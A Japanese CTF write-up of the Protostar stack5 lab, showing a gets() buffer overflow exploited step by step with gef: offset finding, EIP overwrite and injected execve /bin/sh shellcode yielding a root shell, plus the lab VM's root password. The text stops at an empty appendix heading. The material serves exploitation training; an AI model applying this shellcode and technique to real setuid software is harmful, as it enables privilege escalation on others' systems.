<!-- TITLE: Stack 5 -->
<!-- SUBTITLE: A quick summary of Stack 5 -->

# 問題

## 問題のパス

`/opt/protostar/bin/stack5`

## 問題のソースコード

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

非常にシンプルな仕上がり

# ファイルのコピー(scp)

```shell
% scp Protostar:/opt/protostar/bin/stack5 .
% ls | grep stack5
stack5
```

このように`scp`してローカルで基礎解析をしたほうが楽

# GDB解析 その1

## バッファオーバーフローを試す

例によって[`gef`](https://github.com/hugsy/gef/)を使う

```shell
% which gef
gef: aliased to gdb -q --ix $HOME/gef/gef.py
% gef ./stack5
GEF for linux ready, type `gef' to start, `gef config' to configure
66 commands loaded for GDB 7.11.1 using Python engine 3.5
⋮
Reading symbols from ./stack5...done.
gef➤  disas main
Dump of assembler code for function main:
   0x080483c4 <+0>:	push   ebp
   0x080483c5 <+1>:	mov    ebp,esp
   0x080483c7 <+3>:	and    esp,0xfffffff0
   0x080483ca <+6>:	sub    esp,0x50
   0x080483cd <+9>:	lea    eax,[esp+0x10]
   0x080483d1 <+13>:	mov    DWORD PTR [esp],eax
   0x080483d4 <+16>:	call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:	leave  
   0x080483da <+22>:	ret    
End of assembler dump.
```

コードからもわかるとおり、`gets`関数が入力されたバイト数のチェックをしないため、バッファオーバーフローの脆弱性が存在する
breakpointを`gets`呼び出しの直後に貼って、文字列パターンを生成する
このパターンは、のちにオフセットの長さを測るのに用いる

```shell
gef➤  b *main+21
Breakpoint 1 at 0x80483d9: file stack5/stack5.c, line 11.
gef➤  pattern create 128
[+] Generating a pattern of 128 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
[+] Saved as '$_gef0'
gef➤  r <<< $(echo -n 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab')
⋮
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x61616174 in ?? ()
⋮
$eip   : 0x61616174 ("taaa"?)
⋮
```

`$eip` (次の命令のアドレスを格納するレジスタ) が明らかに通常ではありえない値に書き換えられていることがわかった

## オフセットの値

次にこの*"taaa"*の文字列が`$eax`からどれほどアドレスが離れているかを調べる

```shell
gef➤  pattern search 0x61616174
[+] Searching '0x61616174'
[+] Found at offset 76 (little-endian search) likely
[+] Found at offset 73 (big-endian search) 
```

このバイナリはリトルエンディアンである

```shell
gef➤  elf-info 
Magic                 : 7f 45 4c 46
Class                 : 0x1 - 32-bit
Endianness            : 0x1 - Little-Endian
Version               : 0x1
OS ABI                : 0x0 - System V
ABI Version           : 0x0
Type                  : 0x2 - Executable
Machine               : 0x3 - x86
Program Header Table  : 0x00000034
Section Header Table  : 0x00004d28
Header Table          : 0x00000034
ELF Version           : 0x1
Header size           : 0 (0x0)
Entry point           : 0x08048310
``` 

よって、オフセットは **76**


# GDB解析 その2
先ほどとは入力文字列を変えて実行してみる
オフセットが **76** なので、

```shell
gef➤  r <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "B"*128')
Starting program: /home/mkm/Develop/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "B"*128')

Breakpoint 1, main (argc=0x42424242, argv=0x42424242) at stack5/stack5.c:11
⋮
gef➤  telescope $esp l30
0xffffd270│+0x00: 0xffffd280  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	 ← $esp
0xffffd274│+0x04: 0x0000002f ("/"?)
0xffffd278│+0x08: 0xf7e05dc8  →  0x00002b76 ("v+"?)
0xffffd27c│+0x0c: 0xf7fd31b0  →  0xf7df9000  →  0x464c457f
0xffffd280│+0x10: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	 ← $eax
0xffffd284│+0x14: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd288│+0x18: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd28c│+0x1c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd290│+0x20: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd294│+0x24: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd298│+0x28: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffd29c│+0x2c: 0x41414141
0xffffd2a0│+0x30: 0x41414141
0xffffd2a4│+0x34: 0x41414141
0xffffd2a8│+0x38: 0x41414141
0xffffd2ac│+0x3c: 0x41414141
0xffffd2b0│+0x40: 0x41414141
0xffffd2b4│+0x44: 0x41414141
0xffffd2b8│+0x48: 0x41414141
0xffffd2bc│+0x4c: 0x41414141
0xffffd2c0│+0x50: 0x41414141
0xffffd2c4│+0x54: 0x41414141
0xffffd2c8│+0x58: 0x41414141	 ← $ebp
0xffffd2d0│+0x60: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xffffd2d4│+0x64: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xffffd2d8│+0x68: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xffffd2dc│+0x6c: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xffffd2e0│+0x70: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
0xffffd2e4│+0x74: "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? ()
⋮
$eip   : 0xdeadbeef
⋮
```

このように、適切なオフセットとパディング(今回は*"A"*)を用いることで、`$eip`を任意の値に書き換えられることがわかった

## どこに書き換えるか？

`$eip`を自由に書き換えられるということは、次に飛ばすアドレスを好きにできることである
そこで、`$eip`をスタックポインタのアドレスの直後に書き換えて、そこ(`$esp+4`)にshellcodeを仕込んで見る

ただし、`gets`を用いた際に新たにshellを開こうとすると、すぐにターミナルが閉じてしまいコマンドを入力できない
そこで、`/dev/tty`を再度開いたのちに、`/bin/sh`を起動させる
shellcodeは[exploit DB](https://www.exploit-db.com/exploits/13357/)のものを使用した

```python
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
```

まずこのようにして実行してコアダンプを取得

```shell
% ./stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "B"*128')
zsh: segmentation fault (core dumped)  ./stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "B"*128')
% gef ./stack5 ./core
GEF for linux ready, type `gef' to start, `gef config' to configure
⋮
Core was generated by `./stack5'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xdeadbeef in ?? ()
gef➤  telescope $esp-16 l10
[*] Failed to read /proc/<PID>/maps, using GDB sections info: [Errno 2] No such file or directory: '/proc/14581/maps'
0xffffd3a0│+0x00: 0x41414141
0xffffd3a4│+0x04: 0x41414141
0xffffd3a8│+0x08: 0x41414141
0xffffd3ac│+0x0c: 0xdeadbeef
0xffffd3b0│+0x10: 0x42424242	 ← $esp
0xffffd3b4│+0x14: 0x42424242
0xffffd3b8│+0x18: 0x42424242
0xffffd3bc│+0x1c: 0x42424242
0xffffd3c0│+0x20: 0x42424242
0xffffd3c4│+0x24: 0x42424242
gef➤  quit
```

`0xffffd3b0`に`$eip`を設定(書き換え)して、そこにshellcodeを仕込む
`0xffffd3b0` はlittle-endianで `\xb0\xd3\xff\xff`

```shell
% ./stack5 <<< $(python -c 'print "A"*76 + "\xb0\xd3\xff\xff" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
$ ls
core	final1	format0  format2  format4  heap1  heap3  net1  net3  stack0  stack2  stack4  stack6  tmp
final0	final2	format1  format3  heap0    heap2  net0	 net2  net4  stack1  stack3  stack5  stack7
```

# VMでやってみる
もともとはProtostarのものなので、そっちでもやってみる
とはいってもあまり変わらない(やるだけ)

```shell
$ mktemp -d
/tmp/tmp.tQ4Q1WRO1K
$ cd /tmp/tmp.tQ4Q1WRO1K
$ su
Password: godmode
# sysctl -w kernel.core_pattern=core.%s.%e.%p
kernel.core_pattern = core.%s.%e.%p
# sysctl -w fs.suid_dumpable=2
fs.suid_dumpable = 2
# exit
$ /opt/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xef\xbe\xad\xde" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
Segmentation fault (core dumped)
$ ls
core.11.stack5.2416
$ su
Password: godmode
# chmod -v 0666 ./core.11.stack5.2416
mode of `core.11.stack5.2416' changed to 0666 (rw-rw-rw-)
# exit
$ gdb -q /opt/protostar/bin/stack5 ./core.11.stack5.2416
GNU gdb (GDB) 7.0.1-debian

Program terminated with signal 11, Segmentation fault.
#0  0xbfffef38 in ?? ()
(gdb) x/32x $esp-16
0xbffff6c0:	0x41414141	0x41414141	0x41414141	0xdeadbeef
0xbffff6d0:	0xdb31c031	0x80cd06b0	0x742f6853	0x2f687974
0xbffff6e0:	0x89766564	0x66c931e3	0xb02712b9	0x3180cd05
0xbffff6f0:	0x2f6850c0	0x6868732f	0x6e69622f	0x5350e389
0xbffff700:	0xb099e189	0x0080cd0b	0x00000000	0x00000000
0xbffff710:	0xbffff748	0xfe918d38	0xd4c45b28	0x00000000
0xbffff720:	0x00000000	0x00000000	0x00000001	0x08048310
0xbffff730:	0x00000000	0xb7ff6210	0xb7eadb9b	0xb7ffeff4
```

この結果より、`$eip`を`0xbffff6d0`に書き換えればshellが起動する

```shell
$ /opt/protostar/bin/stack5 <<< $(python -c 'print "A"*76 + "\xd0\xf6\xff\xbf" + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
# whoami
root
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

# 付録: NOP sledを使ったやり方について